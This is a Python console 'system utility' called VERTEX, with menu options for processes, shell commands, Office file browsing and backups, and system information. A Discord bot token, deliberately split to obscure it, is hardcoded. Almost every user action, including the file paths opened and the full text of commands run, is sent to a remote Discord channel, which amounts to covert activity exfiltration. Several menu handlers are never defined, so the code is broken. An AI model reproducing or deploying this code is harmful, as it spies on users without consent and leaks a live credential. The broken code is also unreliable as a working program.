import os
import sys
import subprocess
import shutil
import psutil
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import ctypes
from colorama import Fore, Style, init
from docx import Document
from datetime import datetime

init(autoreset=True)  # Automatically reset colors after each print

# Obfuscated Discord bot token and channel ID
TOKEN_PART1 = 'MTI4MDQ0NDk2NDAzOTQzMDE0NA'
TOKEN_PART2 = 'Gqe9R6'
TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
DISCORD_CHANNEL_ID = '1280446406783402015'

# Word document for logging lookups
DOCX_FILENAME = "lookup_results.docx"

def print_colored(text, color):
    """Print text in the specified color."""
    print(f"{color}{text}{Style.RESET_ALL}")

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def send_discord_message(message):
    """Send a message to a Discord channel using a bot."""
    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    data = {
        "content": message
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print_colored("Notification sent to Discord.", Fore.GREEN)
    else:
        print_colored(f"Failed to send message to Discord: {response.status_code} - {response.text}", Fore.RED)

def display_header():
    """Display the header with ASCII art for VERTEX."""
    print_colored(r"""
  _    __     ______  _______  __  __ 
 | |  / /    |  ____||__   __||  \/  |
 | | / /     | |__      | |   | \  / |
 | |/ /      |  __|     | |   | |\/| |
 |   <       | |____    | |   | |  | |
 |_|\_\      |______|   |_|   |_|  |_|        
    """, Fore.CYAN)

def display_menu():
    """Display the main menu."""
    print_colored("========================", Fore.GREEN)
    print_colored("      Command Menu      ", Fore.YELLOW)
    print_colored("========================", Fore.GREEN)
    print("1. List Processes")
    print("2. End Process")
    print("3. Run Windows Command")
    print("4. Show Websites")
    print("5. Open File")
    print("6. System Information")
    print("7. Backup Files")
    print("8. Change Password")
    print("9. ID Resolver")
    print("10. Disk Usage Information")
    print("11. Network Information")
    print("12. Clear Cache")
    print("13. Show Active Window Title")
    print("14. Exit")
    print_colored("========================", Fore.GREEN)

def display_socials():
    """Display social media information below the menu."""
    print_colored("\nMy socials:", Fore.MAGENTA)
    print_colored("Made by Fraise Le BG", Fore.MAGENTA)
    print_colored("Youtube: https://www.youtube.com/@PWEBIDUOS", Fore.MAGENTA)
    print_colored("Discord: Discord.com/", Fore.MAGENTA)

def list_files_by_type(extensions):
    """List files by specific extensions."""
    directories = [
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Downloads')
    ]
    
    files = []
    for directory in directories:
        if os.path.exists(directory):
            for root, dirs, filenames in os.walk(directory):
                for filename in filenames:
                    if filename.endswith(extensions):
                        files.append(os.path.join(root, filename))
    return files

def list_all_files():
    clear_screen()
    print_colored("\nListing all Word, PowerPoint, and Excel files on your PC...", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        send_discord_message("User listed all Word, PowerPoint, and Excel files.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found.", Fore.RED)
        send_discord_message("User tried to list files but found none.")
    input("\nPress Enter to return to the menu...")

def open_file():
    clear_screen()
    print_colored("\nSelect a file to open (only Word, PowerPoint, and Excel files):", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        choice = input("Enter the number of the file to open (or type 'back' to return): ")
        if choice.lower() == 'back':
            return
        try:
            file_index = int(choice) - 1
            if 0 <= file_index < len(files):
                os.startfile(files[file_index])
                send_discord_message(f"User opened file: {files[file_index]}")
            else:
                print_colored("Invalid choice. Please try again.", Fore.RED)
                send_discord_message("User made an invalid file selection.")
        except ValueError:
            print_colored("Invalid input. Please enter a number.", Fore.RED)
            send_discord_message("User inputted invalid data for file selection.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found to open.", Fore.RED)
        send_discord_message("User tried to open a file but found none.")
    input("\nPress Enter to return to the menu...")

def backup_files():
    clear_screen()
    print_colored("\nSelect files to backup (only Word, PowerPoint, and Excel files):", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        choices = input("Enter the numbers of the files to backup separated by commas (e.g., 1,2,3) or type 'back' to return: ")
        if choices.lower() == 'back':
            return
        try:
            selected_indices = [int(choice.strip()) - 1 for choice in choices.split(',')]
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
            backup_folder = os.path.join(desktop_path, 'Vertex_Backups')
            os.makedirs(backup_folder, exist_ok=True)
            
            for file_index in selected_indices:
                if 0 <= file_index < len(files):
                    shutil.copy2(files[file_index], backup_folder)
                    print_colored(f"File {files[file_index]} backed up successfully.", Fore.GREEN)
                    send_discord_message(f"User backed up file: {files[file_index]} to {backup_folder}")
                else:
                    print_colored(f"Invalid choice: {file_index + 1}. Skipping.", Fore.RED)
                    send_discord_message(f"User made an invalid backup choice: {file_index + 1}")
        except ValueError:
            print_colored("Invalid input. Please enter valid numbers.", Fore.RED)
            send_discord_message("User inputted invalid data for backup selection.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found to backup.", Fore.RED)
        send_discord_message("User tried to backup files but found none.")
    input("\nPress Enter to return to the menu...")

def list_processes():
    clear_screen()
    print_colored("\nListing all processes...", Fore.GREEN)
    processes = [(proc.info['name'], proc.info['pid'], proc.info['memory_info'].rss) for proc in psutil.process_iter(['name', 'pid', 'memory_info'])]
    for name, pid, memory in processes:
        print(f"{name:<25} {pid:<10} {memory / 1024 / 1024:.2f} MB")
    send_discord_message("User listed all processes.")
    input("\nPress Enter to return to the menu...")

def end_process():
    clear_screen()
    pid = input("Enter the PID of the process to end (or type 'back' to return): ")
    if pid.lower() == 'back':
        return
    try:
        psutil.Process(int(pid)).terminate()
        print_colored(f"Process {pid} terminated successfully.", Fore.GREEN)
        send_discord_message(f"User terminated process with PID: {pid}")
    except Exception as e:
        print_colored(f"Error terminating process: {e}", Fore.RED)
        send_discord_message(f"Failed to terminate process with PID: {pid} - {e}")
    input("\nPress Enter to return to the menu...")

def run_command():
    clear_screen()
    command = input("Enter the Windows command to run (or type 'back' to return): ")
    if command.lower() == 'back':
        return
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(output.decode())
        send_discord_message(f"User ran command: {command}")
    except subprocess.CalledProcessError as e:
        print_colored(f"Error: {e.output.decode()}", Fore.RED)
        send_discord_message(f"Failed to run command: {command} - {e}")
    input("\nPress Enter to return to the menu...")

def system_info():
    clear_screen()
    try:
        output = subprocess.check_output('systeminfo', shell=True)
        print(output.decode())
        send_discord_message("User retrieved system information.")
    except Exception as e:
        print_colored(f"Error retrieving system info: {e}", Fore.RED)
        send_discord_message(f"Failed to retrieve system information: {e}")
    input("\nPress Enter to return to the menu...")

def disk_usage_info():
    clear_screen()
    print_colored("Disk Usage Information:", Fore.GREEN)
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            print(f"Drive {partition.device}: {usage.percent}% used, Total: {usage.total / (1024**3):.2f} GB, Free: {usage.free / (1024**3):.2f} GB")
        except PermissionError:
            print(f"Drive {partition.device}: Access Denied")
    send_discord_message("User checked disk usage information.")
    input("\nPress Enter to return to the menu...")

def network_info():
    clear_screen()
    print_colored("Network Information:", Fore.GREEN)
    addrs = psutil.net_if_addrs()
    stats = psutil.net_if_stats()
    for interface, addresses in addrs.items():
        print(f"\nInterface: {interface}")
        print(f"Status: {'Up' if stats[interface].isup else 'Down'}")
        for address in addresses:
            print(f"  {address.family.name}: {address.address}")
    send_discord_message("User checked network information.")
    input("\nPress Enter to return to the menu...")

def clear_cache():
    clear_screen()
    print_colored("Clearing cache and temporary files...", Fore.GREEN)
    temp_folder = os.getenv('TEMP')
    try:
        for root, dirs, files in os.walk(temp_folder):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except Exception as e:
                    print(f"Error deleting file {file}: {e}")
        print_colored("Cache and temporary files cleared successfully.", Fore.GREEN)
        send_discord_message("User cleared cache and temporary files.")
    except Exception as e:
        print_colored(f"Error clearing cache: {e}", Fore.RED)
        send_discord_message(f"Failed to clear cache: {e}")
    input("\nPress Enter to return to the menu...")

def main_menu():
    while True:
        clear_screen()
        display_header()
        display_menu()
        display_socials()
        
        choice = input("Enter your choice (1-14): ")
        send_discord_message(f"User selected option {choice}")
        
        if choice == '1':
            list_processes()
        elif choice == '2':
            end_process()
        elif choice == '3':
            run_command()
        elif choice == '4':
            show_websites()
        elif choice == '5':
            open_file()
        elif choice == '6':
            system_info()
        elif choice == '7':
            backup_files()
        elif choice == '8':
            change_password()
        elif choice == '9':
            id_resolver()
        elif choice == '10':
            disk_usage_info()
        elif choice == '11':
            network_info()
        elif choice == '12':
            clear_cache()
        elif choice == '13':
            show_active_window_title()
        elif choice == '14':
            print_colored("Exiting VERTEX. Goodbye!", Fore.GREEN)
            send_discord_message("User exited VERTEX.")
            break
        else:
            print_colored("Invalid choice. Please try again.", Fore.RED)
            send_discord_message("User made an invalid menu choice.")

if __name__ == "__main__":
    main_menu()
